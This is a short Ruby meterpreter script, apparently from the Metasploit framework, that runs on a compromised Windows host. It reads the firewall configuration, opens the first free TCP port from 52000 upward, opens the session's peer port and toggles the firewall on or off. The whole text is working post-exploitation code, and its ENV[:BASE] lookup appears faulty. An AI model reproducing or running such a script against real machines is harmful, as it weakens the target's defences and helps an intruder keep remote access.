# Dynamic load of the winfirewall-api.rb 
def dynamic_require path
    $".delete path if $".include? path
    require path
end

winfirewall_api_path = "#{ENV[:BASE]}/msf3/scripts/meterpreter/winfirewall-api.rb"
dynamic_require winfirewall_api_path

port = 52000
r = read_firewall_config client
if r && r[:channel]
    print_status "Read Firewallconfig successful"
else
    print_error "Read Firewallconfig failed"
end
loop do
    if !r[:tcp].include? port.to_s
        r = open_port client, port
        r = read_firewall_config client
        if r[:tcp].include? port.to_s
            print_status "Opening Port successful"
        else
            print_error "Opening Port failed"
        end
        break
    else
        port +=1
        r = read_firewall_config client
    end
end
open_port client, session.sock.peerport
new_state = "ENABLE" if r[:firewall_state] == "DISABLE"
new_state ||= "DISABLE"
disable_firewall client, new_state
r = read_firewall_config client
if r[:firewall_state] == new_state
  print_status "Change Firewallstatus successful"
else
  print_error "Change Firewallstatus failed"
end

